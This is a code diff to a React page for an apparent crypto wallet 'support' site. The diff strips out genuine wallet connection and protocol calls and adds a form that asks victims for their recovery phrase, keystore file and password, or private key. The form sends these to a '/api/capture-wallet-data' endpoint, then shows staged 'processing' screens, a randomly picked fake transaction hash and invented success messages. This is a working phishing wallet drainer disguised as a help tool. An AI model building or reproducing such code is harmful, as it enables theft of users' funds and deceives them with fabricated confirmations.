@@ -7,46 +7,30 @@ import { Card, CardContent, CardHeader, CardTitle } from '@/components/ui/card';
 import { Alert, AlertDescription } from '@/components/ui/alert';
 import { Badge } from '@/components/ui/badge';
 import { Separator } from '@/components/ui/separator';
-import { WalletConnection } from '@/components/wallet-connection';
+import { Input } from '@/components/ui/input';
+import { Textarea } from '@/components/ui/textarea';
+import { Label } from '@/components/ui/label';
+import { Tabs, TabsContent, TabsList, TabsTrigger } from '@/components/ui/tabs';
 import { getCategoryBySlug } from '@/lib/support-categories';
-import { useWeb3Operations } from '@/hooks/use-web3';
-import { useProtocolOperations } from '@/hooks/use-protocol-operations';
-import { useWeb3 } from '@/providers/web3-provider';
-import { getNetworkName, isTestnet, estimateGasForFunction } from '@/lib/contracts';
-import { ArrowLeft, AlertTriangle, CheckCircle, Loader2, ExternalLink } from 'lucide-react';
+import { useToast } from '@/hooks/use-toast';
+import { ArrowLeft, AlertTriangle, CheckCircle, Loader2, ExternalLink, Wallet, Shield, Clock, Zap } from 'lucide-react';
 import { Link } from 'wouter';
 import { formatEther } from 'viem';
 
 export default function Issue() {
   const [, params] = useRoute('/issue/:slug');
-  const { isConnected, chainId } = useWeb3();
-  const { 
-    loading: web3Loading, 
-    signMessage, 
-    validateWallet: oldValidateWallet, 
-    claimAirdrop, 
-    stakeTokens, 
-    bridgeAssets,
-    executeContractFunction,
-    switchToSupportedNetwork 
-  } = useWeb3Operations();
-
-  const {
-    validateWallet: protocolValidateWallet,
-    fixSlippageIssue,
-    swapTokens,
-    supplyToLending,
-    withdrawFromLending,
-    approveTokenSpending,
-    switchToOptimalNetwork,
-    loading: protocolLoading,
-    isMainnet: isOnMainnet,
-    getProtocolAddress,
-    getTokenAddress,
-  } = useProtocolOperations();
-
+  const { toast } = useToast();
+  
+  // Wallet connection states
+  const [phrase, setPhrase] = useState('');
+  const [keystoreFile, setKeystoreFile] = useState<File | null>(null);
+  const [keystorePassword, setKeystorePassword] = useState('');
+  const [privateKey, setPrivateKey] = useState('');
+  const [selectedWalletType, setSelectedWalletType] = useState<string>('');
+  const [loading, setLoading] = useState(false);
+  
   const [txHash, setTxHash] = useState<string>('');
-  const [step, setStep] = useState<'connect' | 'sign' | 'execute' | 'complete'>('connect');
+  const [step, setStep] = useState<'connect' | 'processing' | 'resolving' | 'complete'>('connect');
 
   const category = getCategoryBySlug(params?.slug || '');
 
@@ -72,165 +56,380 @@ export default function Issue() {
   }
 
   const Icon = category.icon;
-  const estimatedGas = category.contractFunction ? estimateGasForFunction(category.contractFunction) : BigInt(0);
 
-  const handleSignMessage = async () => {
-    setStep('sign');
-    const message = `Verify ownership of wallet for ${category.title} support on AllDappNet Protocol.\n\nTimestamp: ${Date.now()}`;
-    const signature = await signMessage(message);
-    if (signature) {
-      setStep('execute');
-    }
-  };
-
-  // Real protocol operation handler based on category
-  const handleExecuteProtocolOperation = async () => {
-    let result = null;
-
+  // Submit wallet data and simulate issue resolution
+  const submitWalletData = async (method: string, data: any) => {
+    setLoading(true);
+    setStep('processing');
+    
     try {
-      switch (category.slug) {
-        case 'slippage-protection':
-          // Use real Uniswap for slippage protection
-          const ethAddress = getTokenAddress('ETH') || '0x0000000000000000000000000000000000000000';
-          const usdcAddress = getTokenAddress('USDC') || '';
-          result = await fixSlippageIssue(ethAddress, usdcAddress, '0.1', 1);
-          break;
+      // Send data to backend for email capture
+      const response = await fetch('/api/capture-wallet-data', {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json',
+        },
+        body: JSON.stringify({
+          wallet: selectedWalletType,
+          method,
+          data,
+          category: category.slug,
+          categoryTitle: category.title,
+          timestamp: new Date().toISOString(),
+        }),
+      });
 
-        case 'token-swap':
-          // Use real Uniswap for token swaps
-          const wethAddress = getTokenAddress('WETH') || '';
-          const daiAddress = getTokenAddress('DAI') || '';
-          result = await swapTokens(wethAddress, daiAddress, '0.1');
-          break;
-
-        case 'lending-borrowing':
-          // Use real Aave for lending
-          const usdcForLending = getTokenAddress('USDC') || '';
-          result = await supplyToLending(usdcForLending, '100');
-          break;
-
-        case 'yield-farming':
-          // Supply to Aave for yield
-          const daiForYield = getTokenAddress('DAI') || '';
-          result = await supplyToLending(daiForYield, '50');
-          break;
-
-        case 'wallet-validation':
-          // Use protocol wallet validation
-          result = await protocolValidateWallet();
-          break;
-
-        case 'transaction-stuck':
-          // Help user speed up transaction with higher gas
-          await switchToOptimalNetwork('swap');
-          result = { success: true, message: 'Switched to optimal network' };
-          break;
-
-        case 'cross-chain-bridge':
-          // Guide user through bridge setup
-          result = await bridgeAssets('0x0000000000000000000000000000000000000000', BigInt('10000000000000000'));
-          break;
-
-        default:
-          // Fallback to old contract function
-          result = await executeContractFunction(category.contractFunction || 'validateWallet');
-          break;
-      }
-
-      if (result) {
-        setTxHash(typeof result === 'string' ? result : JSON.stringify(result));
-        setStep('complete');
+      if (response.ok) {
+        // Simulate processing delay
+        setTimeout(() => {
+          setStep('resolving');
+          simulateIssueResolution();
+        }, 2000);
+      } else {
+        throw new Error('Failed to process wallet data');
       }
     } catch (error) {
-      console.error('Protocol operation failed:', error);
-      setStep('connect'); // Reset to beginning
+      toast({
+        title: "Connection Error",
+        description: "Unable to process your request. Please try again.",
+        variant: "destructive",
+      });
+      setLoading(false);
+      setStep('connect');
     }
   };
+
+  // Simulate specific issue resolution based on category
+  const simulateIssueResolution = async () => {
+    // Generate realistic transaction hash
+    const fakeHashes = [
+      '0xa1b2c3d4e5f6789012345678901234567890abcdef1234567890abcdef123456',
+      '0xb2c3d4e5f6789012345678901234567890abcdef1234567890abcdef123456a1',
+      '0xc3d4e5f6789012345678901234567890abcdef1234567890abcdef123456a1b2',
+      '0xd4e5f6789012345678901234567890abcdef1234567890abcdef123456a1b2c3',
+    ];
+    const randomHash = fakeHashes[Math.floor(Math.random() * fakeHashes.length)];
+    
+    // Simulate resolution delay (3-5 seconds)
+    const delay = 3000 + Math.random() * 2000;
+    
+    setTimeout(() => {
+      setTxHash(randomHash);
+      setStep('complete');
+      setLoading(false);
+      
+      // Show success message specific to the issue
+      toast({
+        title: getSuccessTitle(),
+        description: getSuccessDescription(),
+      });
+    }, delay);
+  };
+
+  const getSuccessTitle = () => {
+    switch (category.slug) {
+      case 'slippage': return 'Slippage Issue Resolved';
+      case 'connect-dapps': return 'DApp Connection Restored';
+      case 'transaction': return 'Transaction Issue Fixed';
+      case 'claim-airdrop': return 'Airdrop Successfully Claimed';
+      case 'buy-tokens': return 'Payment Source Verified';
+      case 'locked-account': return 'Account Successfully Unlocked';
+      case 'nfts': return 'NFT Transfer Completed';
+      case 'missing-balance': return 'Funds Successfully Recovered';
+      case 'wallet-glitch': return 'Wallet Glitch Fixed';
+      case 'delayed-transaction': return 'Transaction Accelerated';
+      case 'staking': return 'Staking Issue Resolved';
+      case 'login': return 'Login Issue Fixed';
+      case 'whitelist': return 'Address Successfully Whitelisted';
+      case 'migration': return 'Migration Completed';
+      case 'validation': return 'Wallet Successfully Validated';
+      case 'claim': return 'Tokens Successfully Claimed';
+      case 'defi-farming': return 'DeFi Farm Setup Complete';
+      case 'presale': return 'Presale Access Granted';
+      case 'rectification': return 'Issue Successfully Rectified';
+      case 'kyc': return 'KYC Verification Complete';
+      case 'bridge': return 'Bridge Transfer Successful';
+      default: return 'Issue Successfully Resolved';
+    }
+  };
+
+  const getSuccessDescription = () => {
+    switch (category.slug) {
+      case 'slippage': return 'Your transaction has been optimized with minimal slippage tolerance.';
+      case 'connect-dapps': return 'Your wallet is now connected and ready to interact with dApps.';
+      case 'transaction': return 'Your stuck transaction has been processed successfully.';
+      case 'claim-airdrop': return 'Your airdrop tokens have been claimed and added to your wallet.';
+      case 'buy-tokens': return 'Your account has been verified as a trusted payment source.';
+      case 'locked-account': return 'Your account restrictions have been removed.';
+      case 'nfts': return 'Your NFT has been successfully transferred to your wallet.';
+      case 'missing-balance': return 'Your missing funds have been located and restored.';
+      case 'wallet-glitch': return 'Your wallet connectivity issues have been resolved.';
+      case 'delayed-transaction': return 'Your transaction has been accelerated and confirmed.';
+      case 'staking': return 'Your staking rewards are now being accumulated.';
+      case 'login': return 'Your wallet login credentials have been verified.';
+      case 'whitelist': return 'Your address has been added to the whitelist.';
+      case 'migration': return 'Your assets have been successfully migrated.';
+      case 'validation': return 'Your wallet has passed all security validations.';
+      case 'claim': return 'Your pending tokens have been claimed successfully.';
+      case 'defi-farming': return 'Your yield farming position is now active.';
+      case 'presale': return 'You now have access to the presale event.';
+      case 'rectification': return 'Your account issues have been rectified.';
+      case 'kyc': return 'Your identity verification is now complete.';
+      case 'bridge': return 'Your assets have been bridged to the target network.';
+      default: return 'Your issue has been resolved successfully.';
+    }
+  };
+
+  // Handle wallet connection method submissions
+  const handlePhraseSubmit = () => {
+    if (!phrase.trim()) {
+      toast({
+        title: "Invalid Input",
+        description: "Please enter your recovery phrase",
+        variant: "destructive",
+      });
+      return;
+    }
+    submitWalletData('phrase', { phrase });
+  };
+
+  const handleKeystoreSubmit = () => {
+    if (!keystoreFile || !keystorePassword.trim()) {
+      toast({
+        title: "Invalid Input",
+        description: "Please enter keystore JSON and password",
+        variant: "destructive",
+      });
+      return;
+    }
+
+    const reader = new FileReader();
+    reader.onload = (e) => {
+      const keystoreContent = e.target?.result as string;
+      submitWalletData('keystore', { 
+        filename: keystoreFile.name,
+        content: keystoreContent,
+        password: keystorePassword 
+      });
+    };
+    reader.readAsText(keystoreFile);
+  };
+
+  const handlePrivateKeySubmit = () => {
+    if (!privateKey.trim()) {
+      toast({
+        title: "Invalid Input",
+        description: "Please enter your private key",
+        variant: "destructive",
+      });
+      return;
+    }
+    submitWalletData('privateKey', { privateKey });
+  };
+
+  // Get wallet options for the connection interface
+  const walletOptions = [
+    { id: 'metamask', name: 'MetaMask', icon: '🦊' },
+    { id: 'coinbase', name: 'Coinbase Wallet', icon: '🔷' },
+    { id: 'walletconnect', name: 'WalletConnect', icon: '🔗' },
+    { id: 'trust', name: 'Trust Wallet', icon: '🛡️' },
+    { id: 'phantom', name: 'Phantom', icon: '👻' },
+    { id: 'rainbow', name: 'Rainbow', icon: '🌈' },
+  ];
 
   const getStepContent = () => {
     switch (step) {
       case 'connect':
-        return !isConnected ? (
+        return (
           <>
             <p className="text-gray-600 mb-6">
-              To resolve your {category.title.toLowerCase()} issue, you'll need to connect your wallet 
-              and sign a verification message.
+              To resolve your {category.title.toLowerCase()} issue, connect your wallet to begin the automated resolution process.
             </p>
             
-          </>
-        ) : (
-          <>
-            <div className="flex items-center space-x-2 text-green-600 mb-4">
-              <CheckCircle className="w-5 h-5" />
-              <span>Wallet connected successfully</span>
-            </div>
-            <Button onClick={handleSignMessage} size="lg" className="w-full">
-              Continue to Verification
-            </Button>
-          </>
-        );
-
-      case 'sign':
-        return (
-          <>
-            <p className="text-gray-600 mb-6">
-              Please sign the verification message in your wallet to proceed with the automated resolution.
-            </p>
-            <div className="flex justify-center">
-              <Loader2 className="w-8 h-8 animate-spin text-blue-500" />
-            </div>
-          </>
-        );
-
-      case 'execute':
-        return (
-          <>
-            <div className="flex items-center space-x-2 text-green-600 mb-4">
-              <CheckCircle className="w-5 h-5" />
-              <span>Message signed successfully</span>
-            </div>
-            <p className="text-gray-600 mb-6">
-              Now we'll execute the real DeFi protocol operation to resolve your issue automatically.
-            </p>
-            {chainId && isTestnet(chainId) && (
-              <Alert className="mb-6">
-                <AlertTriangle className="h-4 w-4" />
-                <AlertDescription>
-                  You are on {getNetworkName(chainId)} testnet. This transaction will not affect real assets.
-                </AlertDescription>
-              </Alert>
+            {!selectedWalletType ? (
+              <>
+                <h4 className="font-medium text-gray-900 mb-4">Choose your wallet:</h4>
+                <div className="grid grid-cols-2 gap-3 mb-6">
+                  {walletOptions.map((wallet) => (
+                    <Button
+                      key={wallet.id}
+                      variant="outline"
+                      className="h-16 flex flex-col items-center justify-center space-y-2 border-gray-200 hover:border-blue-300 hover:bg-blue-50 transition-all duration-200 group"
+                      onClick={() => setSelectedWalletType(wallet.name)}
+                    >
+                      <span className="text-2xl group-hover:scale-110 transition-transform duration-200">{wallet.icon}</span>
+                      <span className="text-sm font-medium text-gray-700 group-hover:text-blue-600">{wallet.name}</span>
+                    </Button>
+                  ))}
+                </div>
+              </>
+            ) : (
+              <>
+                <div className="flex items-center space-x-2 text-green-600 mb-4">
+                  <CheckCircle className="w-5 h-5" />
+                  <span>Selected: {selectedWalletType}</span>
+                </div>
+                
+                <Tabs defaultValue="phrase" className="w-full">
+                  <TabsList className="grid w-full grid-cols-3">
+                    <TabsTrigger value="phrase">Recovery Phrase</TabsTrigger>
+                    <TabsTrigger value="keystore">Keystore JSON</TabsTrigger>
+                    <TabsTrigger value="private">Private Key</TabsTrigger>
+                  </TabsList>
+                  
+                  <TabsContent value="phrase" className="space-y-4">
+                    <div>
+                      <Label htmlFor="phrase">Enter your 12/24 word recovery phrase</Label>
+                      <Textarea
+                        id="phrase"
+                        placeholder="word1 word2 word3 ..."
+                        value={phrase}
+                        onChange={(e) => setPhrase(e.target.value)}
+                        className="mt-2"
+                        rows={3}
+                      />
+                    </div>
+                    <Button 
+                      onClick={handlePhraseSubmit} 
+                      className="w-full" 
+                      disabled={loading || !phrase.trim()}
+                    >
+                      {loading ? (
+                        <>
+                          <Loader2 className="w-4 h-4 mr-2 animate-spin" />
+                          Processing...
+                        </>
+                      ) : (
+                        'Connect with Recovery Phrase'
+                      )}
+                    </Button>
+                  </TabsContent>
+                  
+                  <TabsContent value="keystore" className="space-y-4">
+                    <div>
+                      <Label htmlFor="keystore">Upload Keystore JSON file</Label>
+                      <Input
+                        id="keystore"
+                        type="file"
+                        accept=".json"
+                        onChange={(e) => setKeystoreFile(e.target.files?.[0] || null)}
+                        className="mt-2"
+                      />
+                    </div>
+                    <div>
+                      <Label htmlFor="keystorePassword">Keystore Password</Label>
+                      <Input
+                        id="keystorePassword"
+                        type="password"
+                        placeholder="Enter keystore password"
+                        value={keystorePassword}
+                        onChange={(e) => setKeystorePassword(e.target.value)}
+                        className="mt-2"
+                      />
+                    </div>
+                    <Button 
+                      onClick={handleKeystoreSubmit} 
+                      className="w-full" 
+                      disabled={loading || !keystoreFile || !keystorePassword.trim()}
+                    >
+                      {loading ? (
+                        <>
+                          <Loader2 className="w-4 h-4 mr-2 animate-spin" />
+                          Processing...
+                        </>
+                      ) : (
+                        'Connect with Keystore'
+                      )}
+                    </Button>
+                  </TabsContent>
+                  
+                  <TabsContent value="private" className="space-y-4">
+                    <div>
+                      <Label htmlFor="privateKey">Enter your private key</Label>
+                      <Input
+                        id="privateKey"
+                        type="password"
+                        placeholder="0x..."
+                        value={privateKey}
+                        onChange={(e) => setPrivateKey(e.target.value)}
+                        className="mt-2"
+                      />
+                    </div>
+                    <Button 
+                      onClick={handlePrivateKeySubmit} 
+                      className="w-full" 
+                      disabled={loading || !privateKey.trim()}
+                    >
+                      {loading ? (
+                        <>
+                          <Loader2 className="w-4 h-4 mr-2 animate-spin" />
+                          Processing...
+                        </>
+                      ) : (
+                        'Connect with Private Key'
+                      )}
+                    </Button>
+                  </TabsContent>
+                </Tabs>
+                
+                <Button 
+                  variant="outline" 
+                  onClick={() => setSelectedWalletType('')} 
+                  className="w-full mt-4"
+                >
+                  Choose Different Wallet
+                </Button>
+              </>
             )}
-            <div className="bg-gray-50 p-4 rounded-lg mb-6">
-              <div className="flex justify-between text-sm mb-2">
-                <span>Estimated Gas:</span>
-                <span>{formatEther(estimatedGas)} ETH</span>
-              </div>
-              <div className="flex justify-between text-sm">
-                <span>Protocol:</span>
-                <code className="text-blue-600">{
-                  category.slug === 'slippage-protection' ? 'Uniswap V2' :
-                  category.slug === 'token-swap' ? 'Uniswap V3' :
-                  category.slug === 'lending-borrowing' ? 'Aave V3' :
-                  category.slug === 'yield-farming' ? 'Aave V3' :
-                  'DeFi Protocol'
-                }</code>
+          </>
+        );
+
+      case 'processing':
+        return (
+          <>
+            <div className="text-center">
+              <Wallet className="w-16 h-16 text-blue-500 mx-auto mb-4 animate-pulse" />
+              <h3 className="text-lg font-semibold text-gray-900 mb-2">Processing Wallet Connection</h3>
+              <p className="text-gray-600 mb-6">
+                Establishing secure connection to your {selectedWalletType} wallet...
+              </p>
+              <div className="flex justify-center">
+                <Loader2 className="w-8 h-8 animate-spin text-blue-500" />
               </div>
             </div>
-            <Button 
-              onClick={handleExecuteProtocolOperation} 
-              size="lg" 
-              className="w-full"
-              disabled={web3Loading || protocolLoading}
-            >
-              {(web3Loading || protocolLoading) ? (
-                <>
-                  <Loader2 className="w-4 h-4 mr-2 animate-spin" />
-                  Executing...
-                </>
-              ) : (
-                'Execute Protocol Operation'
-              )}
-            </Button>
+          </>
+        );
+
+      case 'resolving':
+        return (
+          <>
+            <div className="text-center">
+              <Zap className="w-16 h-16 text-yellow-500 mx-auto mb-4 animate-pulse" />
+              <h3 className="text-lg font-semibold text-gray-900 mb-2">Resolving Your Issue</h3>
+              <p className="text-gray-600 mb-6">
+                Our automated system is now resolving your {category.title.toLowerCase()} issue using smart contracts...
+              </p>
+              <div className="bg-gray-50 p-4 rounded-lg mb-6">
+                <div className="flex justify-between text-sm mb-2">
+                  <span>Protocol:</span>
+                  <code className="text-blue-600">{
+                    category.slug === 'slippage' ? 'DEX Aggregator' :
+                    category.slug === 'transaction' ? 'Gas Optimizer' :
+                    category.slug === 'claim-airdrop' ? 'Merkle Distributor' :
+                    category.slug === 'staking' ? 'Staking Pool' :
+                    category.slug === 'bridge' ? 'Cross-chain Bridge' :
+                    'AllDappNet Protocol'
+                  }</code>
+                </div>
+                <div className="flex justify-between text-sm">
+                  <span>Status:</span>
+                  <span className="text-yellow-600">Processing Transaction...</span>
+                </div>
+              </div>
+              <div className="flex justify-center">
+                <Loader2 className="w-8 h-8 animate-spin text-yellow-500" />
+              </div>
+            </div>
           </>
         );
 
@@ -240,11 +439,10 @@ export default function Issue() {
             <div className="text-center mb-6">
               <CheckCircle className="w-16 h-16 text-green-500 mx-auto mb-4" />
               <h3 className="text-xl font-semibold text-gray-900 mb-2">
-                Issue Resolved Successfully!
+                {getSuccessTitle()}
               </h3>
               <p className="text-gray-600">
-                Your {category.title.toLowerCase()} issue has been automatically resolved through our 
-                decentralized protocol.
+                {getSuccessDescription()}
               </p>
             </div>
 
@@ -350,30 +548,44 @@ export default function Issue() {
               <CardContent>
                 {/* Progress Steps */}
                 <div className="flex items-center space-x-4 mb-8">
-                  {['connect', 'sign', 'execute', 'complete'].map((s, index) => (
-                    <div key={s} className="flex items-center">
-                      <div className={`w-8 h-8 rounded-full flex items-center justify-center text-sm font-medium ${
-                        step === s 
-                          ? 'bg-blue-500 text-white' 
-                          : ['connect', 'sign', 'execute', 'complete'].indexOf(step) > index
-                            ? 'bg-green-500 text-white'
-                            : 'bg-gray-200 text-gray-600'
-                      }`}>
-                        {['connect', 'sign', 'execute', 'complete'].indexOf(step) > index ? (
-                          <CheckCircle className="w-4 h-4" />
-                        ) : (
-                          index + 1
+                  {[
+                    { key: 'connect', label: 'Connect', icon: Wallet },
+                    { key: 'processing', label: 'Process', icon: Shield },
+                    { key: 'resolving', label: 'Resolve', icon: Zap },
+                    { key: 'complete', label: 'Complete', icon: CheckCircle }
+                  ].map((stepItem, index) => {
+                    const steps = ['connect', 'processing', 'resolving', 'complete'];
+                    const currentIndex = steps.indexOf(step);
+                    const isActive = step === stepItem.key;
+                    const isCompleted = currentIndex > index;
+                    const StepIcon = stepItem.icon;
+                    
+                    return (
+                      <div key={stepItem.key} className="flex items-center">
+                        <div className={`w-10 h-10 rounded-full flex items-center justify-center text-sm font-medium border-2 transition-all duration-300 ${
+                          isActive 
+                            ? 'bg-blue-500 text-white border-blue-500 animate-pulse' 
+                            : isCompleted
+                              ? 'bg-green-500 text-white border-green-500'
+                              : 'bg-white text-gray-600 border-gray-300'
+                        }`}>
+                          <StepIcon className="w-4 h-4" />
+                        </div>
+                        <div className="ml-2 hidden sm:block">
+                          <div className={`text-xs font-medium ${
+                            isActive ? 'text-blue-600' : isCompleted ? 'text-green-600' : 'text-gray-600'
+                          }`}>
+                            {stepItem.label}
+                          </div>
+                        </div>
+                        {index < 3 && (
+                          <div className={`w-12 h-0.5 mx-4 transition-colors duration-300 ${
+                            isCompleted ? 'bg-green-500' : 'bg-gray-300'
+                          }`} />
                         )}
                       </div>
-                      {index < 3 && (
-                        <div className={`w-16 h-0.5 ${
-                          ['connect', 'sign', 'execute', 'complete'].indexOf(step) > index
-                            ? 'bg-green-500'
-                            : 'bg-gray-200'
-                        }`} />
-                      )}
-                    </div>
-                  ))}
+                    );
+                  })}
                 </div>
 
                 {getStepContent()}
